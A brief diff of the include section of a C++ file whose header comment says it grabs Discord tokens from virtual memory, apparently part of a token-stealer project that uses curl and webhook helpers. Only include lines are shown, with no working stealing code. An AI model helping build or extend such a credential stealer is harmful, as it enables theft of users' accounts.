@@ -1,23 +1,7 @@
 // --- grabs discord tokens in virtual memory ---
 // deps: libcurlx64 & nlohmannn::json
-#define _CRT_SECURE_NO_WARNINGS
-
 #include <iostream>
-#include <vector>
-#include <regex>
-#include <thread>
 #include <cstdio>
-#include <locale>
-#include <codecvt>
-#include <mutex>
-
-#include <Windows.h>  // windows api
-#include <winternl.h>
-#include <TlHelp32.h>
-
-
-#include <curl/curl.h>
-#include <nlohmann/json.hpp>
 // project inclusions
 #include "include/webhooks.hpp"
 #include "include/tokens.hpp"
